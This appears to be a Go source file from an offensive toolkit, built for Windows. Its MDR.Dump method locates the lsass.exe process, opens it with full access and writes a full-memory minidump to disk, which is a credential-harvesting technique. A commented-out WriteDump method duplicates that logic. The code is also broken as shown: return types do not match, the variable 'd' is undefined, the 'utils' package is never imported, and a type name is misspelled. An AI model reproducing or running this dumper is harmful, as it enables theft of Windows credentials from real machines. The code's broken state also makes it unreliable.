//go:build windows
// +build windows

package zoo
/*
import (
  "fmt"
	"unsafe"
	"syscall"
  "golang.org/x/sys/windows"
)


type Dumper interface {
  Dump() ([]byte,error)
}

type MDR struct{
  Name string
}



func (mdr *MDR) Dump() ([]byte,error){
  var lsassPID uint32
  var lsassHandle windows.Handle
  outFile,err := windows.CreateFile(
    syscall.StringToUTF16Ptr(d.Name),//"lsass.dmp"
    windows.GENERIC_ALL,
    0,
    nil,
    windows.CREATE_ALWAYS,
    windows.FILE_ATTRIBUTE_NORMAL,
  0)
  if err != nil {
    return fmt.Errorf("Error openning file: %v\n",err)
  }
  defer windows.CloseHandle(outFile)
  var entry windows.ProcesEntry32
  entry.Size = uint32(unsafe.Sizeof(entry))
  handle,err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS,0)
  if err != nil{
    return fmt.Errorf("Error creating snapshot: %v",err)
  }
  defer windows.CloseHandle(handle)
  err = windows.Process32First(handle,&entry)
  if err != nil{
    return fmt.Errorf("Error getting the first process: %v.",err)
  }
  for {
    err = windows.Process32Next(handle,&entry)
    if err != nil{
      return fmt.Errorf("Error getting next process: %v",err)
    }
    if syscall.UTF16ToString(entry.ExeFile[:]) == "lsass.exe"{
      lsassPID = entry.ProcessID
      utils.PrintTextInASpecificColor("blue",fmt.Sprintf("Got lsass.exe PID: %d.",lsassPID))
      break
    }
  }
  lsassHandle,err = windows.OpenProcess(windows.PROCESS_ALL_ACCESS,false,lsassPID)
  if err != nil{
    return fmt.Errorf("Error opening process handle: %v",err)
  }
  defer windows.CloseHandle(lsassHandle)
  isDumped := windows.MiniDumpWriteDump(
		lsassHandle,
		uint32(lsassPID),
		windows.Handle(outFile),
		windows.MINIDUMP_TYPE(windows.MiniDumpWithFullMemory),
		nil,
		nil,
		nil)

	if isDumped {
		fmt.Println("[+] lsass dumped successfully!")
    return nil
	}
  return fmt.Errorf("Good luck debugging this.")
}

/*func (mdr *MDR) WriteDump(name string, data []byte)error{
  outFile,err := windows.CreateFile(
    syscall.StringToUTF16Ptr(name),
    windows.GENERIC_ALL,
    0,
    nil,
    windows.CREATE_ALWAYS,
    windows.FILE_ATTRIBUTE_NORMAL,
  0)
  if err != nil {
    return fmt.Errorf("Error openning file: %v\n",err)
  }
  defer windows.CloseHandle(outFile)
  isDumped := windows.MiniDumpWriteDump(
		lsassHandle,
		uint32(lsassPID),
		windows.Handle(outFile),
		windows.MINIDUMP_TYPE(windows.MiniDumpWithFullMemory),
		nil,
		nil,
		nil)

	if isDumped {
		fmt.Println("[+] lsass dumped successfully!")
    return nil
	}
  return errors.New("Good luck debugging this.")
}*/
